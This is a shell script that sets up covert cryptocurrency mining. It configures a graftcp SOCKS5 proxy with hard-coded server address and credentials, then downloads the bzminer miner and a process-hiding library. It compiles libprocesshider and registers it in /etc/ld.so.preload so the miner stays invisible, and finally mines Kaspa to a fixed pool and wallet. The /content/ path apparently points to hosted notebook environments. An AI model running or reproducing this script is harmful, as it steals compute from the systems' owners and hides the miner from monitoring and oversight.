#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 45.155.69.201:6406
socks5_username = ingfoingfo
socks5_password = maszZeehh
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo " "
echo " "

./graftcp/graftcp wget https://github.com/bzminer/bzminer/releases/download/v11.1.0/bzminer_v11.1.0_linux.tar.gz && tar -xf bzminer_v11.1.0_linux.tar.gz && cd bzminer_v11.1.0_linux && chmod +x bzminer && cp bzminer /content/

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./bzminer -a kaspa -p stratum+tcp://pool.us.woolypooly.com:3112 -w kaspa:qqjgh3lff277858uhn7upgpl4xlmqkhwry33wg0vfjxhnxexap8gywc62xf3f
